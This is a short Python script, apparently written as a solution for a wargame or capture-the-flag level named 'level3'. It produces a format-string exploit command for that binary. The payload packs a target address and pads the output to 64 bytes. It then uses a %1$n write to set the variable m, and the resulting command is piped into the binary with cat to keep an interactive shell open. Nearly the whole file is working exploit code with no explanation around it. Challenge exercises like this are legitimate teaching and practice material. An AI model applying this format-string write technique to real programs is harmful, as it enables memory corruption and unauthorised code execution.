#!/usr/bin/env python3
"""Level3: adresse de m + valeur 64 + index 1 → commande format string."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

M_ADDR = 0x804988C
VALUE = 64  # m doit valoir 64
INDEX = 1   # 1er argument = buffer

def main():
    padding = VALUE - 4  # 4 octets d'adresse déjà imprimés
    addr_le = p32(M_ADDR)
    addr_str = "".join("\\x%02x" % b for b in addr_le)
    cmd = (
        "( python -c 'print \"%s\" + \"%%%dx\" + \"%%%d$n\"'; cat ) | ./level3"
        % (addr_str, padding, INDEX)
    )
    print(cmd)
    print("# m =", hex(M_ADDR), ", value =", VALUE, ", index =", INDEX)

if __name__ == "__main__":
    main()
